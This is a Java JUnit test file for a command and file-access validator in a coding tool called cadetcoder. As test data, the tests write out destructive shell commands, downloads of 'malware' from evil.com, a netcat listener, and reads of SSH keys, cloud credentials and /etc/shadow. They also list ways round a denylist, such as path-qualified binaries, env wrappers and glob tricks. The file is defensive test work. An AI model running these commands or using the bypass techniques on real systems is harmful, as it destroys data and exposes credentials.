package com.eonmux.cadetcoder.security;

import com.eonmux.cadetcoder.config.ConfigManager;
import com.eonmux.cadetcoder.config.Configuration;
import org.junit.*;
import org.junit.rules.TemporaryFolder;
import org.mockito.MockedStatic;

import java.io.File;
import java.io.IOException;

import static org.junit.Assert.*;
import static org.mockito.Mockito.*;

/**
 * Comprehensive test for SecurityValidator to achieve 100% coverage
 */
public class SecurityValidatorTest {

    @Rule
    public TemporaryFolder tempFolder = new TemporaryFolder();

    private SecurityValidator            validator;
    private ConfigManager                mockConfigManager;
    private Configuration                mockConfig;
    private Configuration.SecurityConfig mockSecurityConfig;
    private String                       originalWorkingDir;

    @Before
    public void setUp() throws Exception {
        // Set up mocks
        mockConfigManager  = mock(ConfigManager.class);
        mockConfig         = mock(Configuration.class);
        mockSecurityConfig = mock(Configuration.SecurityConfig.class);

        when(mockConfigManager.getConfig()).thenReturn(mockConfig);
        when(mockConfig.getSecurity()).thenReturn(mockSecurityConfig);

        // Set default security config
        when(mockSecurityConfig.isAllowOutsideProject()).thenReturn(false);
        when(mockSecurityConfig.isSandboxMode()).thenReturn(false);

        // Set project root to temp folder
        originalWorkingDir = System.getProperty("user.dir");
        System.setProperty("user.dir", tempFolder.getRoot().getAbsolutePath());
    }

    @After
    public void restoreWorkingDirectory() {
        // user.dir is global JVM state, and the folder it points at here is deleted after the
        // test. Leaving it set breaks unrelated tests that resolve paths against it.
        if (originalWorkingDir != null) {
            System.setProperty("user.dir", originalWorkingDir);
        }
    }

    @Test
    public void aSiblingDirectoryWhoseNameStartsWithTheProjectsIsNotInsideTheProject() throws IOException {
        try (MockedStatic<ConfigManager> configMock = mockStatic(ConfigManager.class)) {
            configMock.when(ConfigManager::getInstance).thenReturn(mockConfigManager);

            validator = new SecurityValidator();

            File root    = tempFolder.getRoot();
            File sibling = new File(root.getParentFile(), root.getName() + "-secrets");
            assertTrue(sibling.mkdirs() || sibling.isDirectory());
            File outside = new File(sibling, "credentials.txt");
            try {
                assertFalse("A path is only inside the project when a separator follows the root",
                            validator.isFileAccessAllowed(outside.getAbsolutePath()));
                assertFalse(validator.isWithinProject(outside.getAbsolutePath()));
            } finally {
                outside.delete();
                sibling.delete();
            }
        }
    }

    @Test
    public void theProjectRootItselfIsInsideTheProject() {
        try (MockedStatic<ConfigManager> configMock = mockStatic(ConfigManager.class)) {
            configMock.when(ConfigManager::getInstance).thenReturn(mockConfigManager);

            validator = new SecurityValidator();

            assertTrue(validator.isWithinProject(tempFolder.getRoot().getAbsolutePath()));
        }
    }

    @Test
    public void testIsFileAccessAllowed_ValidPath() {
        try (MockedStatic<ConfigManager> configMock = mockStatic(ConfigManager.class)) {
            configMock.when(ConfigManager::getInstance).thenReturn(mockConfigManager);

            validator = new SecurityValidator();

            // Create a file in the project directory
            File testFile = null;
            try {
                testFile = tempFolder.newFile("test.txt");
            } catch (IOException e) {
                fail("Failed to create test file: " + e.getMessage());
            }

            assertTrue(validator.isFileAccessAllowed(testFile.getAbsolutePath()));
        }
    }

    @Test
    public void testIsFileAccessAllowed_NullPath() {
        try (MockedStatic<ConfigManager> configMock = mockStatic(ConfigManager.class)) {
            configMock.when(ConfigManager::getInstance).thenReturn(mockConfigManager);

            validator = new SecurityValidator();

            assertFalse(validator.isFileAccessAllowed(null));
        }
    }

    @Test
    public void testIsFileAccessAllowed_EmptyPath() {
        try (MockedStatic<ConfigManager> configMock = mockStatic(ConfigManager.class)) {
            configMock.when(ConfigManager::getInstance).thenReturn(mockConfigManager);

            validator = new SecurityValidator();

            assertFalse(validator.isFileAccessAllowed(""));
            assertFalse(validator.isFileAccessAllowed("   "));
        }
    }

    @Test
    public void testIsFileAccessAllowed_PathTraversal() {
        try (MockedStatic<ConfigManager> configMock = mockStatic(ConfigManager.class)) {
            configMock.when(ConfigManager::getInstance).thenReturn(mockConfigManager);

            validator = new SecurityValidator();

            assertFalse(validator.isFileAccessAllowed("../../../etc/passwd"));
            assertFalse(validator.isFileAccessAllowed("..\\..\\Windows\\System32"));
            assertFalse(validator.isFileAccessAllowed("test/../../../etc/passwd"));
        }
    }

    @Test
    public void testIsFileAccessAllowed_OutsideProject() {
        try (MockedStatic<ConfigManager> configMock = mockStatic(ConfigManager.class)) {
            configMock.when(ConfigManager::getInstance).thenReturn(mockConfigManager);
            when(mockSecurityConfig.isAllowOutsideProject()).thenReturn(false);

            validator = new SecurityValidator();

            assertFalse(validator.isFileAccessAllowed("/etc/passwd"));
            // An absolute path outside the project that no other rule would refuse.
            assertFalse(validator.isFileAccessAllowed(
                    tempFolder.getRoot().getParentFile().getAbsolutePath() + "/elsewhere.txt"));
        }
    }

    @Test
    public void testIsFileAccessAllowed_AllowOutsideProject() {
        try (MockedStatic<ConfigManager> configMock = mockStatic(ConfigManager.class)) {
            configMock.when(ConfigManager::getInstance).thenReturn(mockConfigManager);
            when(mockSecurityConfig.isAllowOutsideProject()).thenReturn(true);

            validator = new SecurityValidator();

            // Should still block dangerous paths
            assertFalse(validator.isFileAccessAllowed("/etc/passwd"));
            // Windows paths are only dangerous on Windows
            if (System.getProperty("os.name").startsWith("Windows")) {
                assertFalse(validator.isFileAccessAllowed("C:\\Windows\\System32\\config"));
            }

            // But allow other outside paths
            assertTrue(validator.isFileAccessAllowed("/tmp/test.txt"));

            // Windows paths on Linux will be allowed since they don't match Linux dangerous paths
            // This is expected behavior - the validator is platform-specific
        }
    }

    @Test
    public void testIsFileAccessAllowed_DangerousPaths() {
        try (MockedStatic<ConfigManager> configMock = mockStatic(ConfigManager.class)) {
            configMock.when(ConfigManager::getInstance).thenReturn(mockConfigManager);
            when(mockSecurityConfig.isAllowOutsideProject()).thenReturn(true);

            validator = new SecurityValidator();

            // Test all dangerous paths
            assertFalse(validator.isFileAccessAllowed("/etc/shadow"));
            assertFalse(validator.isFileAccessAllowed("/boot/grub/grub.cfg"));
            assertFalse(validator.isFileAccessAllowed("/proc/1/mem"));
            assertFalse(validator.isFileAccessAllowed("/sys/class/net"));
            assertFalse(validator.isFileAccessAllowed("/dev/sda"));
            assertFalse(validator.isFileAccessAllowed("/root/.ssh/id_rsa"));
            // Windows paths are only dangerous on Windows
            if (System.getProperty("os.name").startsWith("Windows")) {
                assertFalse(validator.isFileAccessAllowed("C:\\Windows\\System32\\drivers"));
                assertFalse(validator.isFileAccessAllowed("C:\\System32\\config"));
                assertFalse(validator.isFileAccessAllowed("C:\\Program Files\\test.exe"));
            }
        }
    }

    @Test
    public void testIsFileAccessAllowed_CredentialFilesDenied() {
        try (MockedStatic<ConfigManager> configMock = mockStatic(ConfigManager.class)) {
            configMock.when(ConfigManager::getInstance).thenReturn(mockConfigManager);
            // Default config: outside-project access allowed, sandbox off. The
            // credential denylist must still block well-known secret files.
            when(mockSecurityConfig.isAllowOutsideProject()).thenReturn(true);

            validator = new SecurityValidator();

            String home = System.getProperty("user.home");
            assertFalse("~/.m2/settings.xml must be denied",
                    validator.isFileAccessAllowed(home + "/.m2/settings.xml"));
            assertFalse("~/.m2/settings-security.xml must be denied",
                    validator.isFileAccessAllowed(home + "/.m2/settings-security.xml"));
            assertFalse("~/.aws/credentials must be denied",
                    validator.isFileAccessAllowed(home + "/.aws/credentials"));
            assertFalse("~/.aws/config must be denied",
                    validator.isFileAccessAllowed(home + "/.aws/config"));
            assertFalse("~/.netrc must be denied",
                    validator.isFileAccessAllowed(home + "/.netrc"));
            assertFalse("~/.npmrc must be denied",
                    validator.isFileAccessAllowed(home + "/.npmrc"));
            assertFalse("~/.docker/config.json must be denied",
                    validator.isFileAccessAllowed(home + "/.docker/config.json"));
            assertFalse("~/.kube/config must be denied",
                    validator.isFileAccessAllowed(home + "/.kube/config"));
            assertFalse("SSH private key id_rsa must be denied",
                    validator.isFileAccessAllowed(home + "/.ssh/id_rsa"));
            assertFalse("PEM key material must be denied",
                    validator.isFileAccessAllowed(home + "/certs/server.pem"));

            // Direct helper checks (normalized-path matching, not substrings).
            assertTrue(validator.isSensitiveCredentialFile(home + "/.aws/credentials"));
            assertTrue(validator.isSensitiveCredentialFile("/somewhere/id_ed25519"));
            assertFalse("A non-credential file under a .m2-like dir is not blocked",
                    validator.isSensitiveCredentialFile(home + "/project.m2settings/notes.txt"));
            assertFalse("Ordinary in-project file is allowed",
                    validator.isSensitiveCredentialFile("/tmp/test.txt"));
        }
    }

    @Test
    public void testIsFileAccessAllowed_SandboxMode() throws Exception {
        try (MockedStatic<ConfigManager> configMock = mockStatic(ConfigManager.class)) {
            configMock.when(ConfigManager::getInstance).thenReturn(mockConfigManager);
            when(mockSecurityConfig.isSandboxMode()).thenReturn(true);

            validator = new SecurityValidator();

            // Create test files
            File safeFile = tempFolder.newFile("safe.txt");
            File exeFile  = tempFolder.newFile("dangerous.exe");
            File shFile   = tempFolder.newFile("script.sh");
            File batFile  = tempFolder.newFile("script.bat");
            File cmdFile  = tempFolder.newFile("script.cmd");
            File dllFile  = tempFolder.newFile("library.dll");
            File soFile   = tempFolder.newFile("library.so");

            assertTrue(validator.isFileAccessAllowed(safeFile.getAbsolutePath()));
            assertFalse(validator.isFileAccessAllowed(exeFile.getAbsolutePath()));
            assertFalse(validator.isFileAccessAllowed(shFile.getAbsolutePath()));
            assertFalse(validator.isFileAccessAllowed(batFile.getAbsolutePath()));
            assertFalse(validator.isFileAccessAllowed(cmdFile.getAbsolutePath()));
            assertFalse(validator.isFileAccessAllowed(dllFile.getAbsolutePath()));
            assertFalse(validator.isFileAccessAllowed(soFile.getAbsolutePath()));
        }
    }

    @Test
    public void testIsFileAccessAllowed_ExceptionHandling() {
        try (MockedStatic<ConfigManager> configMock = mockStatic(ConfigManager.class)) {
            configMock.when(ConfigManager::getInstance).thenReturn(mockConfigManager);

            validator = new SecurityValidator();

            // Invalid path that causes exception
            assertFalse(validator.isFileAccessAllowed("\0invalid\0path"));
        }
    }

    @Test
    public void testIsCommandExecutionAllowed_ValidCommand() {
        try (MockedStatic<ConfigManager> configMock = mockStatic(ConfigManager.class)) {
            configMock.when(ConfigManager::getInstance).thenReturn(mockConfigManager);

            validator = new SecurityValidator();

            assertTrue(validator.isCommandExecutionAllowed("echo Hello World"));
            assertTrue(validator.isCommandExecutionAllowed("ls -la"));
            assertTrue(validator.isCommandExecutionAllowed("git status"));
        }
    }

    @Test
    public void testIsCommandExecutionAllowed_NullCommand() {
        try (MockedStatic<ConfigManager> configMock = mockStatic(ConfigManager.class)) {
            configMock.when(ConfigManager::getInstance).thenReturn(mockConfigManager);

            validator = new SecurityValidator();

            assertFalse(validator.isCommandExecutionAllowed(null));
            assertFalse(validator.isCommandExecutionAllowed(null, null));
        }
    }

    @Test
    public void testIsCommandExecutionAllowed_EmptyCommand() {
        try (MockedStatic<ConfigManager> configMock = mockStatic(ConfigManager.class)) {
            configMock.when(ConfigManager::getInstance).thenReturn(mockConfigManager);

            validator = new SecurityValidator();

            assertFalse(validator.isCommandExecutionAllowed(""));
            assertFalse(validator.isCommandExecutionAllowed("   "));
        }
    }

    /**
     * Every command a line runs is screened, wherever on the line it is written.
     *
     * <p>The operators themselves are not what is refused. A pipeline, a redirection and a
     * substitution are how shell work is written, and refusing the characters refused the work
     * while stopping nothing: what matters is the program each part of the line starts, and each
     * one is now read and screened in turn.</p>
     */
    @Test
    public void testIsCommandExecutionAllowed_ProgramsHiddenBehindOperators() {
        try (MockedStatic<ConfigManager> configMock = mockStatic(ConfigManager.class)) {
            configMock.when(ConfigManager::getInstance).thenReturn(mockConfigManager);

            validator = new SecurityValidator();

            assertFalse(validator.isCommandExecutionAllowed("echo test; rm -rf /"));
            assertFalse(validator.isCommandExecutionAllowed("echo test && rm -rf /"));
            assertFalse(validator.isCommandExecutionAllowed("cat notes | xargs rm"));
            assertFalse(validator.isCommandExecutionAllowed("echo $(rm -rf /)"));
            assertFalse(validator.isCommandExecutionAllowed("echo `rm -rf /`"));
            assertFalse(validator.isCommandExecutionAllowed("bash -c \'rm -rf /\'"));
            assertFalse(validator.isCommandExecutionAllowed("echo test > /etc/passwd"));
            assertFalse(validator.isCommandExecutionAllowed("echo test < /etc/shadow"));
            assertFalse(validator.isCommandExecutionAllowed("echo test\nrm -rf /"));
            assertFalse(validator.isCommandExecutionAllowed("echo test\rrm -rf /"));
        }
    }

    /** Ordinary shell work, which the character screen used to refuse in its entirety. */
    @Test
    public void testIsCommandExecutionAllowed_OrdinaryShellWork() {
        try (MockedStatic<ConfigManager> configMock = mockStatic(ConfigManager.class)) {
            configMock.when(ConfigManager::getInstance).thenReturn(mockConfigManager);

            validator = new SecurityValidator();

            assertTrue(validator.isCommandExecutionAllowed("grep -r TODO src | wc -l"));
            assertTrue(validator.isCommandExecutionAllowed(
                    "awk \'match($0, /tests=\"[0-9]+\"/) {n++} END {print n}\' report.xml"));
            assertTrue(validator.isCommandExecutionAllowed("ls target/*.xml"));
            // Absolute, because the project root here is a temporary folder while a relative path
            // still resolves against the directory the JVM was started in.
            assertTrue(validator.isCommandExecutionAllowed(
                    "mvn -q test > " + tempFolder.getRoot().getAbsolutePath() + "/build.log"));
            assertTrue(validator.isCommandExecutionAllowed("git status 2>&1"));
            assertTrue(validator.isCommandExecutionAllowed("echo done > /dev/null"));
            assertTrue(validator.isCommandExecutionAllowed("git log --format=%H | head -3"));
        }
    }

    /** A refusal says which rule it applied, so whoever reads it can act on it. */
    @Test
    public void testScreenCommand_SaysWhyItRefused() {
        try (MockedStatic<ConfigManager> configMock = mockStatic(ConfigManager.class)) {
            configMock.when(ConfigManager::getInstance).thenReturn(mockConfigManager);

            validator = new SecurityValidator();

            StringBuilder why = new StringBuilder();
            assertFalse(validator.isCommandExecutionAllowed("echo hello; rm -rf /tmp", why));
            assertTrue(why.toString().contains("rm"));

            SecurityValidator.CommandScreening refused = validator.screenCommand("rm -rf /");
            assertFalse(refused.allowed());
            assertFalse("a denylisted program is not a matter of opinion", refused.reconsiderable());

            SecurityValidator.CommandScreening unreadable = validator.screenCommand("$TOOL --version");
            assertFalse(unreadable.allowed());
            assertTrue("a program nobody can read is for someone else to settle",
                       unreadable.reconsiderable());
        }
    }

    @Test
    public void testIsCommandExecutionAllowed_DangerousCommands() {
        try (MockedStatic<ConfigManager> configMock = mockStatic(ConfigManager.class)) {
            configMock.when(ConfigManager::getInstance).thenReturn(mockConfigManager);

            validator = new SecurityValidator();

            assertFalse(validator.isCommandExecutionAllowed("rm -rf /"));
            assertFalse(validator.isCommandExecutionAllowed("del /f /s /q C:\\"));
            assertFalse(validator.isCommandExecutionAllowed("format C:"));
            assertFalse(validator.isCommandExecutionAllowed("fdisk /dev/sda"));
            assertFalse(validator.isCommandExecutionAllowed("dd if=/dev/zero of=/dev/sda"));
            assertFalse(validator.isCommandExecutionAllowed("mkfs.ext4 /dev/sda"));
            assertFalse(validator.isCommandExecutionAllowed("shutdown -h now"));
            assertFalse(validator.isCommandExecutionAllowed("reboot"));
            assertFalse(validator.isCommandExecutionAllowed("killall -9 java"));
            assertFalse(validator.isCommandExecutionAllowed("pkill -9 firefox"));
            assertFalse(validator.isCommandExecutionAllowed("systemctl stop sshd"));
            assertFalse(validator.isCommandExecutionAllowed("service ssh stop"));
            assertFalse(validator.isCommandExecutionAllowed("sudo rm -rf /"));
            assertFalse(validator.isCommandExecutionAllowed("su -c 'rm -rf /'"));
            assertFalse(validator.isCommandExecutionAllowed("passwd root"));
        }
    }

    @Test
    public void testIsCommandExecutionAllowed_ScriptExecution() {
        try (MockedStatic<ConfigManager> configMock = mockStatic(ConfigManager.class)) {
            configMock.when(ConfigManager::getInstance).thenReturn(mockConfigManager);

            validator = new SecurityValidator();

            assertFalse(validator.isCommandExecutionAllowed("./malicious.sh"));
            assertFalse(validator.isCommandExecutionAllowed("script.bat"));
            assertFalse(validator.isCommandExecutionAllowed("cmd.cmd"));
            assertFalse(validator.isCommandExecutionAllowed("program.exe"));
        }
    }

    @Test
    public void testIsCommandExecutionAllowed_SandboxMode() {
        try (MockedStatic<ConfigManager> configMock = mockStatic(ConfigManager.class)) {
            configMock.when(ConfigManager::getInstance).thenReturn(mockConfigManager);
            when(mockSecurityConfig.isSandboxMode()).thenReturn(true);

            validator = new SecurityValidator();

            // Allowed commands in sandbox mode
            assertTrue(validator.isCommandExecutionAllowed("echo test"));
            assertTrue(validator.isCommandExecutionAllowed("pwd"));
            assertTrue(validator.isCommandExecutionAllowed("cd /tmp"));
            assertTrue(validator.isCommandExecutionAllowed("ls -la"));
            assertTrue(validator.isCommandExecutionAllowed("dir"));
            assertTrue(validator.isCommandExecutionAllowed("cat file.txt"));
            assertTrue(validator.isCommandExecutionAllowed("type file.txt"));
            assertTrue(validator.isCommandExecutionAllowed("grep pattern file"));
            assertTrue(validator.isCommandExecutionAllowed("find . -name '*.txt'"));
            assertTrue(validator.isCommandExecutionAllowed("git status"));
            assertTrue(validator.isCommandExecutionAllowed("mvn clean test"));
            assertTrue(validator.isCommandExecutionAllowed("npm install"));
            assertTrue(validator.isCommandExecutionAllowed("yarn build"));
            assertTrue(validator.isCommandExecutionAllowed("python script.py"));
            assertTrue(validator.isCommandExecutionAllowed("java Main"));
            assertTrue(validator.isCommandExecutionAllowed("javac Main.java"));
            assertTrue(validator.isCommandExecutionAllowed("node app.js"));

            // Disallowed commands in sandbox mode
            assertFalse(validator.isCommandExecutionAllowed("wget http://evil.com/malware"));
            assertFalse(validator.isCommandExecutionAllowed("curl http://evil.com/malware"));
            assertFalse(validator.isCommandExecutionAllowed("nc -l 4444"));
        }
    }

    @Test
    public void testIsCommandExecutionAllowed_WithErrorMessage() {
        try (MockedStatic<ConfigManager> configMock = mockStatic(ConfigManager.class)) {
            configMock.when(ConfigManager::getInstance).thenReturn(mockConfigManager);

            validator = new SecurityValidator();

            StringBuilder errorMessage = new StringBuilder();

            assertTrue(validator.isCommandExecutionAllowed("echo test", errorMessage));
            assertFalse(validator.isCommandExecutionAllowed("rm -rf /", errorMessage));
        }
    }

    @Test
    public void testGetCanonicalPath() {
        try (MockedStatic<ConfigManager> configMock = mockStatic(ConfigManager.class)) {
            configMock.when(ConfigManager::getInstance).thenReturn(mockConfigManager);

            validator = new SecurityValidator();

            // Test absolute path
            String absPath = "/tmp/test.txt";
            String result  = validator.getCanonicalPath(absPath);
            assertNotNull(result);
            assertTrue(result.contains("test.txt"));

            // Test relative path
            String relPath = "test.txt";
            result = validator.getCanonicalPath(relPath);
            assertNotNull(result);
            assertTrue(result.contains("test.txt"));
            assertTrue(result.contains(tempFolder.getRoot().getAbsolutePath()));

            // Test invalid path
            assertNull(validator.getCanonicalPath("\0invalid\0path"));
        }
    }

    @Test
    public void testIsWithinProject() throws Exception {
        try (MockedStatic<ConfigManager> configMock = mockStatic(ConfigManager.class)) {
            configMock.when(ConfigManager::getInstance).thenReturn(mockConfigManager);

            validator = new SecurityValidator();

            // Create a file within project
            File projectFile = tempFolder.newFile("project.txt");
            assertTrue(validator.isWithinProject(projectFile.getAbsolutePath()));

            // Test file outside project
            assertFalse(validator.isWithinProject("/tmp/outside.txt"));

            // Test invalid path
            assertFalse(validator.isWithinProject("\0invalid\0path"));
        }
    }

    @Test
    public void testCommandReferencesCredentialFile_blocksKnownSecretFiles() {
        try (MockedStatic<ConfigManager> configMock = mockStatic(ConfigManager.class)) {
            configMock.when(ConfigManager::getInstance).thenReturn(mockConfigManager);

            validator = new SecurityValidator();

            // The '~/.m2/settings.xml' read that previously slipped through the bash path.
            assertTrue(validator.commandReferencesCredentialFile("cat ~/.m2/settings.xml"));
            assertTrue(validator.commandReferencesCredentialFile("grep pw /home/u/.aws/credentials"));
            assertTrue(validator.commandReferencesCredentialFile("cat ~/.kube/config"));
            assertTrue(validator.commandReferencesCredentialFile("cat id_rsa"));
            assertTrue(validator.commandReferencesCredentialFile("openssl rsa -in server.pem"));
            // Quoted argument the shell would unquote.
            assertTrue(validator.commandReferencesCredentialFile("cat \"~/.m2/settings.xml\""));
            // Stray quotes from `bash -c "cat ~/.m2/settings.xml"` style nesting must not evade.
            assertTrue(validator.commandReferencesCredentialFile("bash -c \"cat ~/.m2/settings.xml\""));
            assertTrue(validator.commandReferencesCredentialFile("bash -c 'cat ~/.aws/credentials'"));
        }
    }

    @Test
    public void testCommandReferencesCredentialFile_allowsOrdinaryCommands() {
        try (MockedStatic<ConfigManager> configMock = mockStatic(ConfigManager.class)) {
            configMock.when(ConfigManager::getInstance).thenReturn(mockConfigManager);

            validator = new SecurityValidator();

            assertFalse(validator.commandReferencesCredentialFile("ls -la src"));
            // 'config' alone must NOT be mistaken for .aws/config or .kube/config.
            assertFalse(validator.commandReferencesCredentialFile("git config --list"));
            assertFalse(validator.commandReferencesCredentialFile("grep TODO src/Main.java"));
            // A public key is not private key material.
            assertFalse(validator.commandReferencesCredentialFile("cat id_rsa.pub"));
            assertFalse(validator.commandReferencesCredentialFile(null));
            assertFalse(validator.commandReferencesCredentialFile("   "));
        }
    }

    @Test
    public void testCommandReferencesCredentialFile_blocksGlobAndEscapeEvasions() {
        try (MockedStatic<ConfigManager> configMock = mockStatic(ConfigManager.class)) {
            configMock.when(ConfigManager::getInstance).thenReturn(mockConfigManager);

            validator = new SecurityValidator();

            // Glob wildcards that expand to a credential file must be blocked.
            assertTrue(validator.commandReferencesCredentialFile("cat ~/.m2/s*.xml"));
            assertTrue(validator.commandReferencesCredentialFile("cat ~/.ssh/id_rs?"));
            assertTrue(validator.commandReferencesCredentialFile("cat ~/.ssh/id_*"));
            assertTrue(validator.commandReferencesCredentialFile("cat ~/.aws/credential?"));
            assertTrue(validator.commandReferencesCredentialFile("cat *.pem"));
            assertTrue(validator.commandReferencesCredentialFile("cat ~/.m2/*.xml"));
            // Wildcard in the DIRECTORY component (bash expands ~/.m* -> ~/.m2).
            assertTrue(validator.commandReferencesCredentialFile("cat ~/.m*/settings.xml"));
            assertTrue(validator.commandReferencesCredentialFile("cat ~/.m?/settings.xml"));
            assertTrue(validator.commandReferencesCredentialFile("cat ~/.a*/credentials"));
            // Backslash-escaped path the shell would still open as ~/.m2/settings.xml.
            assertTrue(validator.commandReferencesCredentialFile("cat ~/.m2/\\settings.xml"));
        }
    }

    @Test
    public void testCommandReferencesCredentialFile_allowsBenignGlobs() {
        try (MockedStatic<ConfigManager> configMock = mockStatic(ConfigManager.class)) {
            configMock.when(ConfigManager::getInstance).thenReturn(mockConfigManager);

            validator = new SecurityValidator();

            // Globs over non-secret files/directories must NOT be falsely blocked.
            assertFalse(validator.commandReferencesCredentialFile("ls *.java"));
            assertFalse(validator.commandReferencesCredentialFile("cat src/*.xml"));
            assertFalse(validator.commandReferencesCredentialFile("ls ~/.m2/repository/x*.jar"));
            // A bare '*' directory segment must NOT match every credential dir.
            assertFalse(validator.commandReferencesCredentialFile("cat ~/projects/*/config.json"));
            // A bare-wildcard final token must NOT be mistaken for a credential file name.
            assertFalse(validator.commandReferencesCredentialFile("ls *"));
            assertFalse(validator.commandReferencesCredentialFile("cat src/*"));
            assertFalse(validator.commandReferencesCredentialFile("grep foo *"));
            assertFalse(validator.commandReferencesCredentialFile("ls target/*"));
            assertFalse(validator.commandReferencesCredentialFile("ls ~/.config/*"));
        }
    }

    @Test
    public void testIsCommandExecutionAllowed_pathQualifiedDangerousCommandIsDenied() {
        try (MockedStatic<ConfigManager> configMock = mockStatic(ConfigManager.class)) {
            configMock.when(ConfigManager::getInstance).thenReturn(mockConfigManager);

            validator = new SecurityValidator();

            // Regression: the denylist used to be tested against parts[0] verbatim, so ANY
            // absolute path defeated it -- "rm" was denied while "/bin/rm" ran.
            assertFalse("rm must stay denied", validator.isCommandExecutionAllowed("rm victim.txt"));
            assertFalse("/bin/rm must be denied like rm",
                    validator.isCommandExecutionAllowed("/bin/rm victim.txt"));
            assertFalse("/usr/bin/rm must be denied like rm",
                    validator.isCommandExecutionAllowed("/usr/bin/rm -rf /"));
            assertFalse("A relative path to a denied binary must be denied",
                    validator.isCommandExecutionAllowed("./bin/rm victim.txt"));
            assertFalse("A quoted denied binary must be denied",
                    validator.isCommandExecutionAllowed("\"/bin/rm\" victim.txt"));
            assertFalse("A backslash-escaped denied binary must be denied",
                    validator.isCommandExecutionAllowed("\\rm victim.txt"));
            assertFalse("A path-qualified script/binary keeps the extension check",
                    validator.isCommandExecutionAllowed("C:\\Windows\\System32\\shutdown.exe /r"));
            assertFalse("A path-qualified shell script must be denied",
                    validator.isCommandExecutionAllowed("/opt/tools/wipe.sh"));
        }
    }

    @Test
    public void testIsCommandExecutionAllowed_prefixRunnersAreUnwrapped() {
        try (MockedStatic<ConfigManager> configMock = mockStatic(ConfigManager.class)) {
            configMock.when(ConfigManager::getInstance).thenReturn(mockConfigManager);

            validator = new SecurityValidator();

            // A prefix runner used to hide the real command from the denylist entirely.
            assertFalse("env must not hide rm", validator.isCommandExecutionAllowed("env rm victim.txt"));
            assertFalse("env assignments must be skipped to reach rm",
                    validator.isCommandExecutionAllowed("env FOO=bar rm victim.txt"));
            assertFalse("A path-qualified env must not hide rm",
                    validator.isCommandExecutionAllowed("/usr/bin/env rm victim.txt"));
            assertFalse("nohup must not hide rm",
                    validator.isCommandExecutionAllowed("nohup rm -rf /tmp/scratch"));
            assertFalse("xargs options must be skipped to reach rm",
                    validator.isCommandExecutionAllowed("xargs -n1 rm"));
            assertFalse("time must not hide a path-qualified rm",
                    validator.isCommandExecutionAllowed("time /bin/rm victim.txt"));

            // A runner wrapping ordinary work must still be allowed -- the point is to test the
            // wrapped command, not to ban the wrappers.
            assertTrue("env wrapping a benign command stays allowed",
                    validator.isCommandExecutionAllowed("env FOO=bar git status"));
            assertTrue("time wrapping a benign command stays allowed",
                    validator.isCommandExecutionAllowed("time mvn test"));
            assertTrue("A bare runner with nothing to unwrap stays allowed",
                    validator.isCommandExecutionAllowed("env"));
        }
    }

    @Test
    public void testIsCommandExecutionAllowed_systemPathArgumentsAreDenied() {
        try (MockedStatic<ConfigManager> configMock = mockStatic(ConfigManager.class)) {
            configMock.when(ConfigManager::getInstance).thenReturn(mockConfigManager);

            validator = new SecurityValidator();

            // The DANGEROUS_PATHS list was only ever consulted for file access, so the shell
            // could read exactly the system files the file commands refuse.
            assertFalse("cat /etc/shadow must be denied",
                    validator.isCommandExecutionAllowed("cat /etc/shadow"));
            assertFalse("cat /etc/passwd must be denied",
                    validator.isCommandExecutionAllowed("cat /etc/passwd"));
            assertFalse("Reading /proc must be denied",
                    validator.isCommandExecutionAllowed("head /proc/self/environ"));
            assertFalse("Listing /root must be denied",
                    validator.isCommandExecutionAllowed("ls /root"));
            assertFalse("A traversal that resolves into /etc must be denied",
                    validator.isCommandExecutionAllowed("cat /tmp/../etc/shadow"));
            assertFalse("A --flag=/path value must be denied too",
                    validator.isCommandExecutionAllowed("grep --file=/etc/shadow pattern"));
            assertFalse("A dangerous path as the program itself must be denied",
                    validator.isCommandExecutionAllowed("/etc/init.d/networking stop"));
        }
    }

    @Test
    public void testIsCommandExecutionAllowed_ordinaryWorkStillAllowed() {
        try (MockedStatic<ConfigManager> configMock = mockStatic(ConfigManager.class)) {
            configMock.when(ConfigManager::getInstance).thenReturn(mockConfigManager);

            validator = new SecurityValidator();

            // The hardening must not cost the everyday commands the tool exists to run.
            assertTrue(validator.isCommandExecutionAllowed("git add ."));
            assertTrue(validator.isCommandExecutionAllowed("echo hello"));
            assertTrue(validator.isCommandExecutionAllowed("ls -la src"));
            assertTrue(validator.isCommandExecutionAllowed("mvn -o test"));
            assertTrue(validator.isCommandExecutionAllowed("grep -rn TODO src"));
            assertTrue(validator.isCommandExecutionAllowed("cat src/main/java/Main.java"));
            assertTrue(validator.isCommandExecutionAllowed("ls -la /tmp"));
            assertTrue("A path-qualified benign binary is not collateral damage",
                    validator.isCommandExecutionAllowed("/usr/bin/git status"));
        }
    }

    @Test
    public void testIsCommandExecutionAllowed_sandboxAllowlistUnchanged() {
        try (MockedStatic<ConfigManager> configMock = mockStatic(ConfigManager.class)) {
            configMock.when(ConfigManager::getInstance).thenReturn(mockConfigManager);
            when(mockSecurityConfig.isSandboxMode()).thenReturn(true);

            validator = new SecurityValidator();

            // Sandbox mode is an opt-in "only these exact invocations" allowlist matched on the
            // raw first token; hardening the denylist must not loosen it.
            assertTrue(validator.isCommandExecutionAllowed("git status"));
            assertFalse("A path-qualified binary is still outside the sandbox allowlist",
                    validator.isCommandExecutionAllowed("/bin/ls -la"));
            assertFalse("A denied binary stays denied in sandbox mode",
                    validator.isCommandExecutionAllowed("/bin/rm victim.txt"));
            assertFalse("A dangerous path argument is denied in sandbox mode too",
                    validator.isCommandExecutionAllowed("cat /etc/shadow"));
        }
    }

    @Test
    public void testCredentialFile_cadetConfigIsProtected() {
        try (MockedStatic<ConfigManager> configMock = mockStatic(ConfigManager.class)) {
            configMock.when(ConfigManager::getInstance).thenReturn(mockConfigManager);
            when(mockSecurityConfig.isAllowOutsideProject()).thenReturn(true);

            validator = new SecurityValidator();

            String home = System.getProperty("user.home");

            // ~/.cadet/config.json holds ai.apiKey / ai.providerApiKeys, which ConfigCommand
            // redacts when printing -- reading it through the shell must not be an easy way round.
            assertTrue("The shell must not read ~/.cadet/config.json",
                    validator.commandReferencesCredentialFile("cat ~/.cadet/config.json"));
            assertTrue("An absolute ~/.cadet/config.json must be caught too",
                    validator.commandReferencesCredentialFile("cat " + home + "/.cadet/config.json"));
            assertTrue(validator.isSensitiveCredentialFile(home + "/.cadet/config.json"));
            assertFalse("The file commands must not read it either",
                    validator.isFileAccessAllowed(home + "/.cadet/config.json"));

            // A project's own config.json is NOT a credential file.
            assertFalse("An in-project config.json stays readable",
                    validator.commandReferencesCredentialFile("cat src/config.json"));
            assertFalse(validator.isSensitiveCredentialFile("/tmp/project/config.json"));
            assertFalse("A config.json under a non-credential parent stays readable",
